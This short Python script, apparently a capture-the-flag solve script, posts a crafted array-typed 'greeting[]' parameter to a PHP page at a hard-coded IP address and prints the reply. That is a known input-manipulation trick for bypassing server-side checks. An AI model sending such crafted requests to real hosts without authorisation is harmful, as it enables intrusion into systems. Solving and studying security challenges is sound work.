#!/usr/bin/python3
#coding:utf-8

import requests

r = requests.post('http://106.75.66.87/index.php', data={
    'greeting[]': 1
})

print(r.text)